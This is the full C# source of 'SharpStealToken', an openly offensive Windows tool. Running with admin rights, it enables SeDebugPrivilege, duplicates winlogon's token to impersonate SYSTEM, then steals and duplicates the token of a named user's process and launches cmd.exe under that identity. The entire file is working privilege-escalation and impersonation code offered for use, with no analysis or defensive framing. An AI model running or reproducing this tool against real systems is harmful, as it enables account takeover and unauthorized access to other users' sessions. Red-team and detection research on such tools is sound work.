using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Management;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;

using static SharpStealToken.Class1;



namespace SharpStealToken
{
    public class Program
    {
        static bool IsRunningAsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        static string GetOwner(int processId)
        {
            string query = $"SELECT * FROM Win32_Process WHERE ProcessId = {processId}";
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
            using (ManagementObjectCollection results = searcher.Get())
            {
                foreach (ManagementObject mo in results)
                {
                    object[] outParameters = new object[2];
                    mo.InvokeMethod("GetOwner", outParameters);
                    return $"{outParameters[0]}";
                }
            }
            return null;
        }

        static List<int> GetProcessIdByUser(string userName)
        {
            var query = $"SELECT ProcessId FROM Win32_Process WHERE Name LIKE '%'";
            var searcher = new ManagementObjectSearcher(query);

            var pids = new List<int>();

            foreach (ManagementObject obj in searcher.Get())
            {
                int processId = Convert.ToInt32(obj["ProcessId"]);
                string owner = GetOwner(processId);

                if (owner == userName)
                {
                    pids.Add(processId);
                }
            }
            return pids;
        }

        static bool EnablePriv(string priv, IntPtr hToken = default)
        {
            bool clsToken = false;
            if (hToken == IntPtr.Zero) {
                clsToken = true;
                if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ACCESS_MASK.TOKEN_ADJUST_PRIVILEGES | TOKEN_ACCESS_MASK.TOKEN_QUERY, out hToken))
                {
                    Console.Error.WriteLine($"[EnablePriv] OpenProcessToken: {Marshal.GetLastWin32Error()}");
                    return false;
                }
                //Console.WriteLine($"[DEBUG][EnablePriv] OpenProcessToken: {Marshal.GetLastWin32Error()}");
            }

            try
            {
                if (!LookupPrivilegeValue(null, priv, out LUID luid))
                {
                    Console.Error.WriteLine($"[EnablePriv] LookupPrivilegeValue: {Marshal.GetLastWin32Error()}");
                    return false;
                }
                //Console.WriteLine($"[DEBUG][EnablePriv] LookupPrivilegeValue: {Marshal.GetLastWin32Error()}");

                TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Privileges = new LUID_AND_ATTRIBUTES[1]
                };
                tp.Privileges[0].Luid = luid;
                tp.Privileges[0].Attributes = TOKEN_PRIVILEGES_ATTRIBUTES.SE_PRIVILEGE_ENABLED;

                bool res = AdjustTokenPrivileges(hToken, false, ref tp, (uint)Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero);
                if (!res && Marshal.GetLastWin32Error() != 0)
                {
                    Console.Error.WriteLine($"[EnablePriv] AdjustTokenPrivileges: {Marshal.GetLastWin32Error()}");
                    return false;
                }
                //Console.WriteLine($"[DEBUG][EnablePriv] AdjustTokenPrivileges: {Marshal.GetLastWin32Error()}");

                PRIVILEGE_SET privs = new PRIVILEGE_SET
                {
                    PrivilegeCount = 1,
                    Control = PRIVILEGE_SET.PRIVILEGE_SET_ALL_NECESSARY,
                    Privilege = new LUID_AND_ATTRIBUTES[1]
                };
                privs.Privilege[0].Luid = luid;
                privs.Privilege[0].Attributes = TOKEN_PRIVILEGES_ATTRIBUTES.SE_PRIVILEGE_ENABLED;

                if (!PrivilegeCheck(hToken, ref privs, out bool bResult))
                {

                    Console.Error.WriteLine($"[EnablePriv] PrivilegeCheck: {Marshal.GetLastWin32Error()}");
                    return false;
                }
                //Console.WriteLine($"[DEBUG][EnablePriv] PrivilegeCheck: {Marshal.GetLastWin32Error()}");

                return bResult;
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                return false;
            }
            finally
            {
                if (clsToken == true) CloseHandle(hToken);
            }
            
        }

        static bool GetSystem()
        {
            var hToken = IntPtr.Zero;
            var hTokenDup = IntPtr.Zero;
            var winLogon = Process.GetProcessesByName("winlogon")[0];

            try
            {
                // open handle to token (SYSTEM)
                if (!OpenProcessToken(winLogon.Handle, TOKEN_ACCESS_MASK.TOKEN_DUPLICATE, out hToken))
                {
                    Console.Error.WriteLine($"[GetSystem] OpenProcessToken: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                // duplicate token (SYSTEM)
                var sa = new SECURITY_ATTRIBUTES();
                if (!DuplicateTokenEx(hToken, TOKEN_ACCESS_MASK.TOKEN_ALL_ACCESS, ref sa,
                    SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                    TOKEN_TYPE.TokenImpersonation, out hTokenDup))
                {
                    Console.Error.WriteLine($"[GetSystem] DuplicateTokenEx: {Marshal.GetLastWin32Error()}");
                    return false;
                }
                
                if (!EnablePriv("SeAssignPrimaryTokenPrivilege", hTokenDup))
                {
                    Console.Error.WriteLine($"[GetSystem] SeAssignPrimaryTokenPrivilege: {Marshal.GetLastWin32Error()}");
                    return false;
                }
                Console.WriteLine($"+ SeAssignPrimaryTokenPrivilege enable");

                // impersonate SYSTEM
                if (!ImpersonateLoggedOnUser(hTokenDup))
                {
                    Console.Error.WriteLine($"[GetSystem] ImpersonateLoggedOnUser: {Marshal.GetLastWin32Error()}");
                    return false;
                }
                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                return false;
            }
            finally
            {
                // close token handles
                if (hToken != IntPtr.Zero) CloseHandle(hToken);
                if (hTokenDup != IntPtr.Zero) CloseHandle(hTokenDup);

                winLogon.Dispose();
            }
        }
        
        static bool StealToken(int processId)
        {
            var hToken = IntPtr.Zero;
            var hTokenDup = IntPtr.Zero;
            var process = Process.GetProcessById(processId);

            try
            {
                // open handle to token
                if (!OpenProcessToken(process.Handle, TOKEN_ACCESS_MASK.TOKEN_ALL_ACCESS, out hToken))
                {
                    Console.Error.WriteLine($"[StealToken] OpenProcessToken: {Marshal.GetLastWin32Error()}");
                    return false;
                }
                //Console.WriteLine($"[DEBUG][StealToken] OpenProcessToken: {Marshal.GetLastWin32Error()}");

                // duplicate token
                var sa = new SECURITY_ATTRIBUTES();
                if (!DuplicateTokenEx(hToken, TOKEN_ACCESS_MASK.TOKEN_ALL_ACCESS, ref sa,
                    SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                    TOKEN_TYPE.TokenPrimary, out hTokenDup))
                {
                    Console.Error.WriteLine($"[StealToken] DuplicateTokenEx: {Marshal.GetLastWin32Error()}");
                    return false;
                }
                //Console.WriteLine($"[DEBUG][StealToken] DuplicateTokenEx: {Marshal.GetLastWin32Error()}");

                // set session id
                /*uint sessionId = (uint)Process.GetCurrentProcess().SessionId;
                if (!SetTokenInformation(hTokenDup, TOKEN_INFORMATION_CLASS.TokenSessionId, ref sessionId, sizeof(uint)))
                {
                    Console.Error.WriteLine($"- failed to set session id: {Marshal.GetLastWin32Error()}");
                    return false;
                }
                Console.WriteLine($"[DEBUG][StealToken] SetTokenInformation: {Marshal.GetLastWin32Error()}");*/


                // impersonate user

                //RevertToSelf();

                string cmd = Environment.GetEnvironmentVariable("windir") + @"\System32\cmd.exe";
                
                STARTUPINFO si = new STARTUPINFO();

                if (!CreateProcessWithTokenW(
                    hTokenDup,
                    0,
                    null,
                    cmd,
                    0,
                    IntPtr.Zero,
                    null,
                    ref si,
                    out PROCESS_INFORMATION pi))
                {
                    Console.Error.WriteLine($"[StealToken] CreateProcessWithTokenW: {Marshal.GetLastWin32Error()}");
                    return false;

                }

                //Console.Error.WriteLine($"[DEBUG][StealToken] CreateProcessWithTokenW: {Marshal.GetLastWin32Error()}");

                var identity = new WindowsIdentity(hTokenDup);
                Console.WriteLine($"+ successfully impersonation {identity.Name}");
                Console.WriteLine($"+ process create {pi.dwProcessId}");

                return true;

            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                return false;
            }
            finally
            {
                // close token handles
                if (hToken != IntPtr.Zero) CloseHandle(hToken);
                if (hTokenDup != IntPtr.Zero) CloseHandle(hTokenDup);

                process.Dispose();
            }
        }

        static void Main(string[] args)
        {
            Console.WriteLine($"\n        --++ R3dw0lv3s ++--");
            Console.WriteLine($"     --++ SharpStealToken ++--\n");

            if (args.Length < 1)
            {
                Console.WriteLine("+ use: SharpStealToken.exe \"johndoe\" or SharpStealToken.exe \"SYSTEM\"");
                return;
            }

            if (!IsRunningAsAdministrator())
            {
                Console.WriteLine("- necessary admin privs");
                return;
            }

            Console.WriteLine($"+ current process as: {WindowsIdentity.GetCurrent().Name}");

            // SeDebugPrivilege
            if (!EnablePriv("SeDebugPrivilege"))
            {
                Console.WriteLine($"- error EnablePrivilege");
                return;
            }
            Console.WriteLine($"+ SeDebugPrivilege enable");

            if (!GetSystem())
            {
                Console.WriteLine($"- error GetSystem()");
                return;
            }

            Console.WriteLine($"+ current process as: {WindowsIdentity.GetCurrent().Name}");

            string userName = args[0];

            if (userName == "SYSTEM")
            {
                Process winLogon = Process.GetProcessesByName("winlogon")[0];
                StealToken(winLogon.Id);
            }
            else
            {
                var pids = GetProcessIdByUser(userName);
                if (!pids.Any())
                {
                    Console.WriteLine($"- no process for {userName}");
                    return;
                }

                foreach (var pid in pids)
                {
                    Console.WriteLine($"+ processId for {userName} found: {pid}");
                    if (StealToken(pid))
                    {
                        return;
                    }
                }
            }
        }
    }
}
